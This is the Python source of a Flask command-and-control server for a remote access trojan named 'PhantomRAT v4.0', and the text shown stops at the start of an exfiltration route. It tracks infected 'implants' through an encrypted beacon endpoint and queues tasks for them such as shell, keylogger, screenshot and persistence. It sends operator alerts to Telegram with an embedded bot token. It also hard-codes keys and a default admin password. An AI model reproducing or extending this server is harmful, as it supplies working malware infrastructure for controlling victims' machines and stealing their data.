#!/usr/bin/env python3
"""
PhantomRAT C2 Server v4.0 - Fixed Version
Enhanced dashboard with animated rat visualization and modern UI.
"""

import json
import time
import sqlite3
import hashlib
import base64
import os
import threading
from flask import Flask, request, jsonify, render_template, redirect, url_for, session, g
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
from functools import wraps
import requests
import random
from datetime import datetime, timedelta

app = Flask(__name__)
app.config['SECRET_KEY'] = 'e4850f012d54d170077a91b8f02e60ca64e6a2c7a6d5bad5'
app.config['DATABASE'] = 'phantom_c2.db'
app.config['SESSION_TYPE'] = 'filesystem'

# Load profile
with open('malleable_profile.json', 'r') as f:
    PROFILE = json.load(f)

ENCRYPTION_KEY = b"phantomrat_32_char_encryption_key_here"
FERNET_KEY = base64.urlsafe_b64encode(hashlib.sha256(ENCRYPTION_KEY).digest())
CIPHER = Fernet(FERNET_KEY)

BOT_TOKEN = '8441637477:AAF4yVWTmXniWE8WYdkLiS5WAsd0vE43qk4'
CHAT_ID = '7279310150'

# Color scheme for PhantomRat
RAT_COLORS = ['#1a1a2e', '#16213e', '#0f3460', '#e94560']
ANIMATION_STATES = ['idle', 'running', 'sneaking', 'attacking']

# ============= FIX: ADD MISSING DECORATOR =============
def login_required(f):
    """Decorator to require login for routes"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login_page'))
        return f(*args, **kwargs)
    return decorated_function

# ============= FIX: ADD MISSING HELPER FUNCTIONS =============
def check_password_hash(stored_hash, password):
    """Check if password matches stored hash"""
    return hashlib.sha256(password.encode()).hexdigest() == stored_hash

def encrypt_data(data):
    """Encrypt data for transmission"""
    try:
        return CIPHER.encrypt(json.dumps(data).encode())
    except:
        return b''

def decrypt_data(encrypted_data):
    """Decrypt received data"""
    try:
        return json.loads(CIPHER.decrypt(encrypted_data).decode())
    except:
        return None

def send_telegram(message):
    """Send notification to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": CHAT_ID,
            "text": message
        }
        requests.post(url, json=data, timeout=5)
    except:
        pass

class RatAnimation:
    """Rat animation generator for dashboard visualization"""
    
    @staticmethod
    def generate_svg_rat(state='idle', color='#0f3460'):
        """Generate SVG rat with animation"""
        if state == 'running':
            svg = f'''
            <svg width="120" height="80" viewBox="0 0 120 80">
                <!-- Animated rat body -->
                <g id="phantom-rat">
                    <!-- Tail - wagging animation -->
                    <path d="M95,40 Q105,35 110,40 Q105,45 95,40" 
                          fill="{color}" opacity="0.8">
                        <animate attributeName="d" dur="0.5s" repeatCount="indefinite"
                            values="M95,40 Q105,35 110,40 Q105,45 95,40;
                                    M95,40 Q105,45 110,40 Q105,35 95,40"/>
                    </path>
                    
                    <!-- Body - moving animation -->
                    <ellipse cx="60" cy="40" rx="25" ry="15" fill="{color}">
                        <animate attributeName="rx" values="25;26;25" dur="1s" repeatCount="indefinite"/>
                    </ellipse>
                    
                    <!-- Head -->
                    <ellipse cx="40" cy="40" rx="12" ry="10" fill="{color}">
                        <animate attributeName="cy" values="40;41;40" dur="0.8s" repeatCount="indefinite"/>
                    </ellipse>
                    
                    <!-- Ears -->
                    <circle cx="35" cy="35" r="4" fill="{color}" opacity="0.9"/>
                    <circle cx="35" cy="35" r="2" fill="#ffffff"/>
                    <circle cx="45" cy="35" r="4" fill="{color}" opacity="0.9"/>
                    <circle cx="45" cy="35" r="2" fill="#ffffff"/>
                    
                    <!-- Eyes - glowing effect -->
                    <circle cx="35" cy="40" r="2" fill="#e94560">
                        <animate attributeName="r" values="2;3;2" dur="1s" repeatCount="indefinite"/>
                    </circle>
                    <circle cx="45" cy="40" r="2" fill="#e94560">
                        <animate attributeName="r" values="2;3;2" dur="1s" repeatCount="indefinite" begin="0.5s"/>
                    </circle>
                    
                    <!-- Whiskers -->
                    <line x1="30" y1="42" x2="20" y2="40" stroke="{color}" stroke-width="1">
                        <animate attributeName="x2" values="20;22;20" dur="0.7s" repeatCount="indefinite"/>
                    </line>
                    <line x1="30" y1="45" x2="20" y2="47" stroke="{color}" stroke-width="1">
                        <animate attributeName="x2" values="20;22;20" dur="0.7s" repeatCount="indefinite" begin="0.2s"/>
                    </line>
                    <line x1="30" y1="38" x2="20" y2="36" stroke="{color}" stroke-width="1">
                        <animate attributeName="x2" values="20;22;20" dur="0.7s" repeatCount="indefinite" begin="0.4s"/>
                    </line>
                    
                    <!-- Legs - running animation -->
                    <rect x="55" y="50" width="4" height="10" fill="{color}">
                        <animate attributeName="y" values="50;48;50" dur="0.4s" repeatCount="indefinite"/>
                    </rect>
                    <rect x="65" y="48" width="4" height="10" fill="{color}">
                        <animate attributeName="y" values="48;50;48" dur="0.4s" repeatCount="indefinite" begin="0.2s"/>
                    </rect>
                    <rect x="50" y="48" width="4" height="10" fill="{color}">
                        <animate attributeName="y" values="48;50;48" dur="0.4s" repeatCount="indefinite" begin="0.1s"/>
                    </rect>
                    <rect x="70" y="50" width="4" height="10" fill="{color}">
                        <animate attributeName="y" values="50;48;50" dur="0.4s" repeatCount="indefinite" begin="0.3s"/>
                    </rect>
                    
                    <!-- Digital trail effect -->
                    <path d="M80,40 Q90,38 95,40" stroke="#e94560" stroke-width="1" fill="none" opacity="0.6">
                        <animate attributeName="opacity" values="0.6;0.2;0.6" dur="1s" repeatCount="indefinite"/>
                        <animate attributeName="d" values="M80,40 Q90,38 95,40;M80,40 Q90,42 95,40" dur="0.5s" repeatCount="indefinite"/>
                    </path>
                    
                    <!-- Binary code particles -->
                    <text x="85" y="35" font-size="8" fill="#e94560" opacity="0.7">1010</text>
                    <animateTransform attributeName="transform" type="translate" 
                        values="0,0; 5,0; 0,0" dur="2s" repeatCount="indefinite"/>
                </g>
            </svg>
            '''
        elif state == 'sneaking':
            svg = f'''
            <svg width="120" height="80" viewBox="0 0 120 80">
                <!-- Sneaking rat -->
                <g id="phantom-rat">
                    <!-- Flattened body -->
                    <ellipse cx="60" cy="45" rx="30" ry="10" fill="{color}" opacity="0.9">
                        <animate attributeName="ry" values="10;8;10" dur="2s" repeatCount="indefinite"/>
                    </ellipse>
                    
                    <!-- Low profile head -->
                    <ellipse cx="35" cy="45" rx="10" ry="8" fill="{color}">
                        <animate attributeName="cx" values="35;36;35" dur="3s" repeatCount="indefinite"/>
                    </ellipse>
                    
                    <!-- Eyes - scanning -->
                    <circle cx="32" cy="45" r="2" fill="#e94560">
                        <animate attributeName="fill" values="#e94560;#ff6b6b;#e94560" dur="2s" repeatCount="indefinite"/>
                    </circle>
                    <circle cx="38" cy="45" r="2" fill="#e94560">
                        <animate attributeName="fill" values="#e94560;#ff6b6b;#e94560" dur="2s" repeatCount="indefinite" begin="1s"/>
                    </circle>
                    
                    <!-- Sneaking shadow -->
                    <ellipse cx="60" cy="52" rx="28" ry="5" fill="#000000" opacity="0.2">
                        <animate attributeName="opacity" values="0.2;0.1;0.2" dur="1.5s" repeatCount="indefinite"/>
                    </ellipse>
                </g>
            </svg>
            '''
        else:  # idle state
            svg = f'''
            <svg width="120" height="80" viewBox="0 0 120 80">
                <!-- Idle PhantomRat -->
                <g id="phantom-rat">
                    <!-- Body with subtle pulse -->
                    <ellipse cx="60" cy="40" rx="25" ry="15" fill="{color}" opacity="0.95">
                        <animate attributeName="opacity" values="0.95;0.85;0.95" dur="3s" repeatCount="indefinite"/>
                    </ellipse>
                    
                    <!-- Head -->
                    <ellipse cx="40" cy="40" rx="12" ry="10" fill="{color}"/>
                    
                    <!-- Ears -->
                    <circle cx="35" cy="35" r="5" fill="{color}">
                        <animate attributeName="r" values="5;4.5;5" dur="1s" repeatCount="indefinite"/>
                    </circle>
                    <circle cx="45" cy="35" r="5" fill="{color}">
                        <animate attributeName="r" values="5;4.5;5" dur="1s" repeatCount="indefinite" begin="0.5s"/>
                    </circle>
                    
                    <!-- Eyes - slow blink -->
                    <circle cx="35" cy="40" r="3" fill="#e94560">
                        <animate attributeName="r" values="3;1;3" dur="4s" repeatCount="indefinite"/>
                    </circle>
                    <circle cx="45" cy="40" r="3" fill="#e94560">
                        <animate attributeName="r" values="3;1;3" dur="4s" repeatCount="indefinite" begin="2s"/>
                    </circle>
                    
                    <!-- Tail - slow wag -->
                    <path d="M75,40 Q85,35 90,40" stroke="{color}" stroke-width="4" fill="none">
                        <animate attributeName="d" dur="2s" repeatCount="indefinite"
                            values="M75,40 Q85,35 90,40;
                                    M75,40 Q85,45 90,40;
                                    M75,40 Q85,35 90,40"/>
                    </path>
                    
                    <!-- Digital aura -->
                    <circle cx="60" cy="40" r="30" fill="none" stroke="#e94560" stroke-width="1" opacity="0.3">
                        <animate attributeName="r" values="30;32;30" dur="2s" repeatCount="indefinite"/>
                        <animate attributeName="opacity" values="0.3;0.5;0.3" dur="2s" repeatCount="indefinite"/>
                    </circle>
                    
                    <!-- Binary glow particles -->
                    <text x="65" y="30" font-size="6" fill="#e94560" opacity="0.6">
                        <animate attributeName="opacity" values="0.6;0.8;0.6" dur="1.5s" repeatCount="indefinite"/>
                        1011
                    </text>
                    <text x="70" y="50" font-size="6" fill="#e94560" opacity="0.6">
                        <animate attributeName="opacity" values="0.6;0.8;0.6" dur="1.5s" repeatCount="indefinite" begin="0.7s"/>
                        0101
                    </text>
                </g>
            </svg>
            '''
        return svg
    
    @staticmethod
    def generate_rat_card(implant_data):
        """Generate HTML card with animated rat for each implant"""
        states = ['idle', 'running', 'sneaking']
        state = random.choice(states) if implant_data.get('status') == 'active' else 'idle'
        color = random.choice(RAT_COLORS[:3])
        
        return f'''
        <div class="rat-card" data-implant-id="{implant_data.get('id', 'unknown')}">
            <div class="rat-animation">
                {RatAnimation.generate_svg_rat(state, color)}
            </div>
            <div class="rat-info">
                <h4>👻 {implant_data.get('hostname', 'Unknown')[:15] or implant_data.get('id', 'unknown')[:8]}</h4>
                <p><strong>OS:</strong> {implant_data.get('os', 'Unknown')}</p>
                <p><strong>IP:</strong> {implant_data.get('ip', 'Unknown')}</p>
                <p><strong>Last Seen:</strong> <span class="time-ago" data-time="{implant_data.get('last_seen', 0)}"></span></p>
                <span class="status-badge {'status-active' if implant_data.get('status') == 'active' else 'status-inactive'}">
                    {implant_data.get('status', 'inactive').upper()}
                </span>
            </div>
        </div>
        '''

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(app.config['DATABASE'])
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_db(error):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

def init_db():
    with app.app_context():
        db = get_db()
        
        # Create implants table
        db.execute('''
            CREATE TABLE IF NOT EXISTS implants (
                id TEXT PRIMARY KEY,
                os TEXT,
                hostname TEXT,
                ip TEXT,
                last_seen REAL,
                status TEXT DEFAULT 'inactive',
                first_seen REAL DEFAULT (strftime('%s', 'now'))
            )
        ''')
        
        # Create tasks table
        db.execute('''
            CREATE TABLE IF NOT EXISTS tasks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                implant_id TEXT,
                command TEXT,
                arguments TEXT,
                status TEXT DEFAULT 'pending',
                created_at REAL DEFAULT (strftime('%s', 'now')),
                delivered_at REAL,
                completed_at REAL,
                result TEXT,
                FOREIGN KEY (implant_id) REFERENCES implants (id)
            )
        ''')
        
        # Create users table
        db.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE,
                password_hash TEXT
            )
        ''')
        
        # Add default admin user if not exists
        existing = db.execute('SELECT COUNT(*) as count FROM users WHERE username = ?', ('admin',)).fetchone()
        if existing['count'] == 0:
            password_hash = hashlib.sha256('phantomrat'.encode()).hexdigest()
            db.execute('INSERT INTO users (username, password_hash) VALUES (?, ?)', 
                      ('admin', password_hash))
        
        db.commit()
        print("[+] Database initialized successfully")

@app.route('/')
@login_required
def dashboard():
    db = get_db()
    implants = db.execute('SELECT * FROM implants ORDER BY last_seen DESC').fetchall()
    tasks = db.execute('SELECT * FROM tasks ORDER BY created_at DESC LIMIT 10').fetchall()
    
    active_count = db.execute('SELECT COUNT(*) FROM implants WHERE status = ?', ('active',)).fetchone()[0]
    pending_count = db.execute('SELECT COUNT(*) FROM tasks WHERE status = ?', ('pending',)).fetchone()[0]
    completed_count = db.execute('SELECT COUNT(*) FROM tasks WHERE status = ?', ('completed',)).fetchone()[0]
    
    # Generate rat cards for implants
    rat_cards = ''.join([RatAnimation.generate_rat_card(dict(implant)) for implant in implants])
    
    html = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>👻 PhantomRAT Dashboard v4.0</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            :root {{
                --primary-dark: #0f172a;
                --secondary-dark: #1e293b;
                --accent-red: #e94560;
                --accent-blue: #0ea5e9;
                --text-light: #f1f5f9;
                --text-muted: #94a3b8;
            }}
            
            * {{
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }}
            
            body {{
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
                color: var(--text-light);
                min-height: 100vh;
                padding: 20px;
            }}
            
            .header {{
                text-align: center;
                padding: 20px 0;
                margin-bottom: 30px;
                border-bottom: 2px solid var(--accent-red);
                position: relative;
                overflow: hidden;
            }}
            
            .header::before {{
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 200%;
                height: 100%;
                background: linear-gradient(90deg, transparent, rgba(233, 69, 96, 0.1), transparent);
                animation: shine 3s infinite;
            }}
            
            @keyframes shine {{
                0% {{ left: -100%; }}
                100% {{ left: 100%; }}
            }}
            
            .logo {{
                font-size: 2.5em;
                background: linear-gradient(45deg, var(--accent-red), var(--accent-blue));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin-bottom: 10px;
                animation: float 3s ease-in-out infinite;
            }}
            
            @keyframes float {{
                0%, 100% {{ transform: translateY(0px); }}
                50% {{ transform: translateY(-10px); }}
            }}
            
            .stats-grid {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }}
            
            .stat-card {{
                background: rgba(30, 41, 59, 0.8);
                border-radius: 15px;
                padding: 25px;
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.1);
                transition: transform 0.3s, box-shadow 0.3s;
                position: relative;
                overflow: hidden;
            }}
            
            .stat-card:hover {{
                transform: translateY(-5px);
                box-shadow: 0 10px 30px rgba(233, 69, 96, 0.3);
            }}
            
            .stat-card::before {{
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                height: 3px;
                background: linear-gradient(90deg, var(--accent-red), var(--accent-blue));
            }}
            
            .stat-number {{
                font-size: 2.5em;
                font-weight: bold;
                background: linear-gradient(45deg, var(--accent-red), var(--accent-blue));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }}
            
            .implants-grid {{
                display: grid;
                grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }}
            
            .rat-card {{
                background: rgba(30, 41, 59, 0.8);
                border-radius: 15px;
                padding: 20px;
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.1);
                transition: all 0.3s;
                cursor: pointer;
                display: flex;
                align-items: center;
                gap: 15px;
            }}
            
            .rat-card:hover {{
                transform: translateY(-3px);
                box-shadow: 0 5px 20px rgba(233, 69, 96, 0.2);
                border-color: var(--accent-red);
            }}
            
            .rat-animation {{
                flex-shrink: 0;
                filter: drop-shadow(0 0 10px rgba(233, 69, 96, 0.3));
            }}
            
            .rat-info h4 {{
                margin-bottom: 8px;
                color: var(--accent-red);
            }}
            
            .status-badge {{
                display: inline-block;
                padding: 3px 10px;
                border-radius: 20px;
                font-size: 0.8em;
                font-weight: bold;
                margin-top: 5px;
            }}
            
            .status-active {{
                background: rgba(34, 197, 94, 0.2);
                color: #4ade80;
                border: 1px solid #4ade80;
            }}
            
            .status-inactive {{
                background: rgba(239, 68, 68, 0.2);
                color: #f87171;
                border: 1px solid #f87171;
            }}
            
            .tasks-table {{
                background: rgba(30, 41, 59, 0.8);
                border-radius: 15px;
                padding: 20px;
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.1);
                margin-bottom: 30px;
            }}
            
            table {{
                width: 100%;
                border-collapse: collapse;
            }}
            
            th, td {{
                padding: 15px;
                text-align: left;
                border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            }}
            
            th {{
                color: var(--accent-blue);
                font-weight: 600;
            }}
            
            .task-form {{
                background: rgba(30, 41, 59, 0.8);
                border-radius: 15px;
                padding: 25px;
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.1);
            }}
            
            .form-grid {{
                display: grid;
                grid-template-columns: 1fr 2fr auto;
                gap: 15px;
                align-items: end;
            }}
            
            input, select, button {{
                padding: 12px 15px;
                border: 1px solid rgba(255, 255, 255, 0.2);
                border-radius: 8px;
                background: rgba(15, 23, 42, 0.8);
                color: var(--text-light);
                font-size: 1em;
            }}
            
            input:focus, select:focus {{
                outline: none;
                border-color: var(--accent-red);
                box-shadow: 0 0 0 3px rgba(233, 69, 96, 0.2);
            }}
            
            button {{
                background: linear-gradient(45deg, var(--accent-red), var(--accent-blue));
                border: none;
                color: white;
                font-weight: bold;
                cursor: pointer;
                transition: transform 0.2s, box-shadow 0.2s;
            }}
            
            button:hover {{
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(233, 69, 96, 0.4);
            }}
            
            .nav-bar {{
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 30px;
            }}
            
            .logout-btn {{
                background: rgba(239, 68, 68, 0.2);
                color: #f87171;
                border: 1px solid #f87171;
                padding: 10px 20px;
                border-radius: 8px;
                text-decoration: none;
                transition: all 0.3s;
            }}
            
            .logout-btn:hover {{
                background: rgba(239, 68, 68, 0.4);
                transform: translateY(-2px);
            }}
            
            .live-indicator {{
                display: inline-block;
                width: 8px;
                height: 8px;
                background: #4ade80;
                border-radius: 50%;
                margin-right: 8px;
                animation: pulse 2s infinite;
            }}
            
            @keyframes pulse {{
                0% {{ opacity: 1; }}
                50% {{ opacity: 0.5; }}
                100% {{ opacity: 1; }}
            }}
            
            @media (max-width: 768px) {{
                .form-grid {{
                    grid-template-columns: 1fr;
                }}
                
                .implants-grid {{
                    grid-template-columns: 1fr;
                }}
                
                .stats-grid {{
                    grid-template-columns: 1fr;
                }}
            }}
        </style>
    </head>
    <body>
        <div class="nav-bar">
            <h1 class="logo">👻 PhantomRAT v4.0</h1>
            <a href="/logout" class="logout-btn">Logout</a>
        </div>
        
        <div class="header">
            <h2><span class="live-indicator"></span>Command & Control Dashboard</h2>
            <p>Active Network Surveillance System</p>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <h3>Active Rats</h3>
                <div class="stat-number">{active_count}</div>
                <p>Connected implants</p>
            </div>
            <div class="stat-card">
                <h3>Pending Tasks</h3>
                <div class="stat-number">{pending_count}</div>
                <p>Awaiting execution</p>
            </div>
            <div class="stat-card">
                <h3>Completed Tasks</h3>
                <div class="stat-number">{completed_count}</div>
                <p>Successful operations</p>
            </div>
            <div class="stat-card">
                <h3>Total Implants</h3>
                <div class="stat-number">{len(implants)}</div>
                <p>All time deployments</p>
            </div>
        </div>
        
        <h2 style="margin: 30px 0 15px 0; color: var(--accent-red);">👥 Active PhantomRats</h2>
        <div class="implants-grid">
            {rat_cards if rat_cards else '<p style="grid-column: 1 / -1; text-align: center; color: var(--text-muted);">No implants connected yet...</p>'}
        </div>
        
        <h2 style="margin: 30px 0 15px 0; color: var(--accent-blue);">📋 Recent Tasks</h2>
        <div class="tasks-table">
            <table>
                <thead>
                    <tr>
                        <th>Task ID</th>
                        <th>Target Rat</th>
                        <th>Command</th>
                        <th>Status</th>
                        <th>Created</th>
                    </tr>
                </thead>
                <tbody>
                    {"".join(f'<tr><td>#{t["id"]}</td><td>{t["implant_id"][:8] if t["implant_id"] else "N/A"}...</td><td><code>{t["command"]}</code></td><td><span class="status-badge status-{t["status"]}">{t["status"].upper()}</span></td><td>{datetime.fromtimestamp(t["created_at"]).strftime("%H:%M:%S") if t["created_at"] else "N/A"}</td></tr>' for t in tasks) if tasks else '<tr><td colspan="5" style="text-align: center; color: var(--text-muted);">No tasks yet...</td></tr>'}
                </tbody>
            </table>
        </div>
        
        <h2 style="margin: 30px 0 15px 0; color: var(--accent-red);">🎯 Issue New Task</h2>
        <div class="task-form">
            <form action="/upload_task" method="post" id="taskForm">
                <div class="form-grid">
                    <div>
                        <label for="implant_id">Target Rat ID:</label>
                        <select name="implant_id" id="implant_id" required>
                            <option value="">Select a rat...</option>
                            {"".join(f'<option value="{i["id"]}">{i["hostname"] or i["id"][:8]} ({i["id"][:8]})</option>' for i in implants)}
                        </select>
                    </div>
                    <div>
                        <label for="cmd">Command:</label>
                        <input type="text" name="cmd" id="cmd" placeholder="shell, download, screenshot, keylogger..." required list="commands">
                        <datalist id="commands">
                            <option value="shell">
                            <option value="download">
                            <option value="screenshot">
                            <option value="keylogger">
                            <option value="persist">
                            <option value="cleanup">
                        </datalist>
                    </div>
                    <button type="submit">🚀 Deploy Task</button>
                </div>
            </form>
        </div>
        
        <script>
            // Update time ago display
            function updateTimeAgo() {{
                document.querySelectorAll('.time-ago').forEach(el => {{
                    const timestamp = parseInt(el.dataset.time);
                    if (!timestamp) {{
                        el.textContent = 'never';
                        return;
                    }}
                    
                    const diff = Math.floor((Date.now() / 1000) - timestamp);
                    
                    if (diff < 60) {{
                        el.textContent = 'just now';
                    }} else if (diff < 3600) {{
                        el.textContent = Math.floor(diff / 60) + 'm ago';
                    }} else if (diff < 86400) {{
                        el.textContent = Math.floor(diff / 3600) + 'h ago';
                    }} else {{
                        el.textContent = Math.floor(diff / 86400) + 'd ago';
                    }}
                }});
            }}
            
            // Interactive rat cards
            document.querySelectorAll('.rat-card').forEach(card => {{
                card.addEventListener('click', () => {{
                    const implantId = card.dataset.implantId;
                    document.getElementById('implant_id').value = implantId;
                    document.getElementById('cmd').focus();
                }});
            }});
            
            // Auto-refresh every 30 seconds
            setInterval(() => {{
                location.reload();
            }}, 30000);
            
            // Initial time update
            updateTimeAgo();
            
            // Form submission feedback
            const taskForm = document.getElementById('taskForm');
            if (taskForm) {{
                taskForm.addEventListener('submit', function(e) {{
                    e.preventDefault();
                    const button = this.querySelector('button[type="submit"]');
                    const originalText = button.textContent;
                    button.textContent = '🚀 Deploying...';
                    button.disabled = true;
                    
                    // Submit form
                    fetch(this.action, {{
                        method: 'POST',
                        body: new FormData(this)
                    }}).then(response => {{
                        if (response.ok) {{
                            button.textContent = '✅ Deployed!';
                            setTimeout(() => location.reload(), 1000);
                        }} else {{
                            button.textContent = '❌ Failed';
                            setTimeout(() => {{
                                button.textContent = originalText;
                                button.disabled = false;
                            }}, 2000);
                        }}
                    }}).catch(() => {{
                        button.textContent = '❌ Error';
                        setTimeout(() => {{
                            button.textContent = originalText;
                            button.disabled = false;
                        }}, 2000);
                    }});
                }});
            }}
            
            // Add keyboard shortcut
            document.addEventListener('keydown', (e) => {{
                if (e.ctrlKey && e.key === 'k') {{
                    e.preventDefault();
                    const cmdInput = document.getElementById('cmd');
                    if (cmdInput) cmdInput.focus();
                }}
            }});
        </script>
    </body>
    </html>
    '''
    return html

@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        
        db = get_db()
        user = db.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
        
        if user and check_password_hash(user['password_hash'], password):
            session['user_id'] = user['id']
            return jsonify({'status': 'success'})
        return jsonify({'status': 'error'})
    
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>👻 PhantomRAT Login</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            
            .login-container {
                background: rgba(30, 41, 59, 0.9);
                border-radius: 20px;
                padding: 40px;
                width: 100%;
                max-width: 400px;
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255, 255, 255, 0.1);
                box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
                position: relative;
                overflow: hidden;
            }
            
            .login-container::before {
                content: '';
                position: absolute;
                top: 0;
                left: 0;
                right: 0;
                height: 3px;
                background: linear-gradient(90deg, #e94560, #0ea5e9);
            }
            
            .rat-animation {
                text-align: center;
                margin-bottom: 30px;
                filter: drop-shadow(0 0 20px rgba(233, 69, 96, 0.3));
            }
            
            h1 {
                text-align: center;
                color: #e94560;
                margin-bottom: 30px;
                font-size: 2em;
                background: linear-gradient(45deg, #e94560, #0ea5e9);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }
            
            .form-group {
                margin-bottom: 20px;
            }
            
            label {
                display: block;
                margin-bottom: 8px;
                color: #94a3b8;
                font-size: 0.9em;
            }
            
            input {
                width: 100%;
                padding: 12px 15px;
                border: 1px solid rgba(255, 255, 255, 0.2);
                border-radius: 8px;
                background: rgba(15, 23, 42, 0.8);
                color: #f1f5f9;
                font-size: 1em;
                transition: all 0.3s;
            }
            
            input:focus {
                outline: none;
                border-color: #e94560;
                box-shadow: 0 0 0 3px rgba(233, 69, 96, 0.2);
            }
            
            button {
                width: 100%;
                padding: 12px;
                background: linear-gradient(45deg, #e94560, #0ea5e9);
                border: none;
                border-radius: 8px;
                color: white;
                font-size: 1em;
                font-weight: bold;
                cursor: pointer;
                transition: transform 0.2s, box-shadow 0.2s;
                margin-top: 10px;
            }
            
            button:hover {
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(233, 69, 96, 0.4);
            }
            
            .error-message {
                color: #f87171;
                text-align: center;
                margin-top: 15px;
                display: none;
            }
            
            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
                20%, 40%, 60%, 80% { transform: translateX(5px); }
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="rat-animation">
                ''' + RatAnimation.generate_svg_rat('idle', '#e94560') + '''
            </div>
            <h1>👻 PhantomRAT v4.0</h1>
            <form id="loginForm">
                <div class="form-group">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" required autofocus>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit">Login</button>
                <div class="error-message" id="errorMessage">Invalid credentials</div>
            </form>
        </div>
        
        <script>
            document.getElementById('loginForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                const errorMessage = document.getElementById('errorMessage');
                const button = this.querySelector('button');
                
                const originalText = button.textContent;
                button.textContent = 'Authenticating...';
                button.disabled = true;
                
                try {
                    const response = await fetch('/login', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ username, password })
                    });
                    
                    const data = await response.json();
                    
                    if (data.status === 'success') {
                        window.location.href = '/';
                    } else {
                        errorMessage.style.display = 'block';
                        this.style.animation = 'shake 0.5s';
                        setTimeout(() => {
                            this.style.animation = '';
                        }, 500);
                    }
                } catch (error) {
                    errorMessage.textContent = 'Connection error';
                    errorMessage.style.display = 'block';
                }
                
                button.textContent = originalText;
                button.disabled = false;
            });
            
            // Add enter key support
            document.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    document.getElementById('loginForm').dispatchEvent(new Event('submit'));
                }
            });
        </script>
    </body>
    </html>
    '''
    return html

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect(url_for('login_page'))

@app.route('/upload_task', methods=['POST'])
@login_required
def upload_task():
    implant_id = request.form.get('implant_id')
    command = request.form.get('cmd')
    
    if not implant_id or not command:
        return redirect(url_for('dashboard'))
    
    db = get_db()
    db.execute('INSERT INTO tasks (implant_id, command, status) VALUES (?, ?, ?)',
              (implant_id, command, 'pending'))
    db.commit()
    
    send_telegram(f"📝 New task created: {command} for implant {implant_id[:8]}")
    return redirect(url_for('dashboard'))

@app.route('/phantom/beacon', methods=['POST'])
def beacon():
    if request.headers.get('User-Agent') != PROFILE['security']['user_agent']:
        return '', 403
    
    try:
        data = decrypt_data(request.data)
        if not data:
            return '', 400
        
        implant_id = data.get('id')
        if not implant_id:
            return '', 400
        
        db = get_db()
        
        # Update or insert implant
        db.execute('''
            INSERT OR REPLACE INTO implants (id, os, hostname, ip, last_seen, status)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (
            implant_id, 
            data.get('os', 'Unknown'), 
            data.get('hostname', 'Unknown'), 
            data.get('ip', 'Unknown'), 
            time.time(), 
            'active'
        ))
        
        # Get pending tasks
        tasks = db.execute('SELECT * FROM tasks WHERE implant_id = ? AND status = ?', 
                          (implant_id, 'pending')).fetchall()
        task_list = []
        for task in tasks:
            task_list.append({
                'id': task['id'],
                'command': task['command'],
                'arguments': task['arguments']
            })
            db.execute('UPDATE tasks SET status = ?, delivered_at = ? WHERE id = ?', 
                      ('delivered', time.time(), task['id']))
        
        db.commit()
        send_telegram(f"🔄 Beacon from {implant_id[:8]}")
        
        # Return encrypted task list
        return encrypt_data(task_list)
    except Exception as e:
        print(f"[!] Beacon error: {e}")
        return '', 400

@app.route('/phantom/exfil', methods=['POST'])
def exfil():
